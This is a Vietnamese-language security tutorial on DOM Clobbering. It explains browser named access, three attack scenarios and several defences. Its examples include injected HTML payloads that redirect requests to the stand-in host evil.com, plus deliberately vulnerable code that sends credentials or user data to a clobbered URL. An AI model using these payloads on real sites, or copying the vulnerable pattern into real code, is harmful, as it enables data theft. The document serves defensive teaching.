# DOM Clobbering

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-79 | **Nguồn**: PortSwigger Research, HTML Living Standard

## 🧱 Kiến thức Nền tảng

Trong trình duyệt, mỗi phần tử HTML có thuộc tính `id` hoặc `name` sẽ tự động được đăng ký như một thuộc tính trên đối tượng `window` và `document`. Đây là hành vi **Named Access** được quy định trong HTML spec — khi một thẻ có `id="config"`, trình duyệt tạo ra `window.config` trỏ đến phần tử DOM đó.

Cơ chế này tồn tại để tương thích ngược với các trang web cũ. Tuy nhiên, nó tạo ra một bề mặt tấn công nguy hiểm: kẻ tấn công có thể **ghi đè** (clobber) các biến JavaScript toàn cục mà ứng dụng đang sử dụng, chỉ bằng cách inject HTML thuần — không cần chạy script.

Điểm mấu chốt là nhiều HTML sanitizer (như DOMPurify phiên bản cũ) chỉ lọc `<script>`, event handler (`onerror`, `onclick`...) nhưng **cho phép** thuộc tính `id` và `name` vì chúng được coi là "an toàn". Kẻ tấn công lợi dụng điều này để clobbering các biến cấu hình, URL endpoint, hoặc flag kiểm tra bảo mật.

```html
<!-- Normal named access behavior in browsers -->
<div id="greeting">Hello World</div>

<script>
  // Browser automatically creates window.greeting -> <div> element
  console.log(window.greeting);          // <div id="greeting">Hello World</div>
  console.log(window.greeting.toString()); // [object HTMLDivElement]
</script>
```

Với thẻ `<a>` hoặc `<area>`, thuộc tính `href` khiến `.toString()` trả về giá trị URL — đây là yếu tố then chốt trong nhiều chuỗi khai thác DOM Clobbering.

## 🔍 Mô tả lỗ hổng

DOM Clobbering xảy ra khi ứng dụng web:

1. **Cho phép inject HTML** (qua editor WYSIWYG, bình luận, email HTML...) nhưng dùng sanitizer lọc script.
2. **Sử dụng biến toàn cục** mà không kiểm tra kiểu dữ liệu — ví dụ `if (window.config)` hoặc truy cập `window.config.url` mà không xác minh `config` có phải object JavaScript hay phần tử DOM.
3. **Sanitizer không lọc `id`/`name`** — cho phép kẻ tấn công ghi đè các biến quan trọng.

Hậu quả: bypass CSP, thực thi XSS gián tiếp, chiếm quyền điều hướng ứng dụng, hoặc vô hiệu hóa các cơ chế bảo vệ phía client.

## ⚔️ Cơ chế tấn công

**Kịch bản 1 — Ghi đè biến cấu hình đơn giản:**

```html
<!-- Attacker injects this HTML (passes sanitizer since no script tags) -->
<a id="configUrl" href="https://evil.com/steal">Click</a>
```

```javascript
// Vulnerable application code
// Developer expects configUrl to be a string variable
let endpoint = window.configUrl || "https://api.legit.com/data";

// After clobbering: endpoint = "https://evil.com/steal"
// because <a>.toString() returns href value
fetch(endpoint, { credentials: "include" });
```

**Kịch bản 2 — Clobbering thuộc tính lồng nhau bằng `<form>`:**

```html
<!-- Clobber window.config.url using form + input -->
<form id="config" name="config">
  <input name="url" value="https://evil.com/exfil">
</form>

<script>
  // window.config -> <form> element
  // window.config.url -> <input> element
  // window.config.url.value -> "https://evil.com/exfil"
  console.log(window.config.url.value); // attacker-controlled
</script>
```

**Kịch bản 3 — Bypass sanitizer để đạt XSS:**

```html
<!-- Clobber a security flag that guards innerHTML assignment -->
<div id="sanitizerEnabled"></div>
<!-- window.sanitizerEnabled is now truthy (DOM element), but not boolean true -->
<!-- If code does: if(!window.sanitizerEnabled) { skip sanitization } -->
<!-- Attacker can manipulate logic depending on how the flag is checked -->
```

## 🛡️ Biện pháp phòng thủ

1. **Không dùng biến toàn cục trên `window`** — sử dụng `const`/`let` trong scope cục bộ hoặc module ES6:
   ```javascript
   // SECURE: Use module-scoped variables, immune to clobbering
   const config = Object.freeze({
     apiUrl: "https://api.legit.com",
     debug: false
   });
   ```

2. **Kiểm tra kiểu dữ liệu** trước khi sử dụng:
   ```javascript
   // SECURE: Type-check before use
   if (typeof window.configUrl === "string") {
     fetch(window.configUrl);
   }
   ```

3. **Cấu hình DOMPurify loại bỏ `id`/`name`:**
   ```javascript
   // SECURE: Strip dangerous attributes during sanitization
   const clean = DOMPurify.sanitize(dirty, {
     FORBID_ATTR: ["id", "name"],
     FORBID_TAGS: ["form"]
   });
   ```

4. **Sử dụng Content Security Policy** với `script-src` nghiêm ngặt để giảm thiểu hậu quả nếu clobbering thành công.

## 💻 Code Example

```javascript
// ❌ VULNERABLE: Global variable can be clobbered
// If attacker injects <a id="analyticsEndpoint" href="https://evil.com">
let url = window.analyticsEndpoint || "/api/analytics";
navigator.sendBeacon(url, JSON.stringify(userData));

// ✅ SECURE: Use local constant with type validation
const ANALYTICS_ENDPOINT = "/api/analytics";

function sendAnalytics(data) {
  // Hardcoded constant cannot be clobbered
  const url = ANALYTICS_ENDPOINT;
  
  // Additional URL validation
  if (!url.startsWith("/") && !url.startsWith("https://trusted.com")) {
    throw new Error("Invalid analytics endpoint");
  }
  
  navigator.sendBeacon(url, JSON.stringify(data));
}
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/dom-based/dom-clobbering
- OWASP: https://owasp.org/www-community/attacks/DOM_Clobbering
- CWE: https://cwe.mitre.org/data/definitions/79.html
- HTML Spec Named Access: https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object
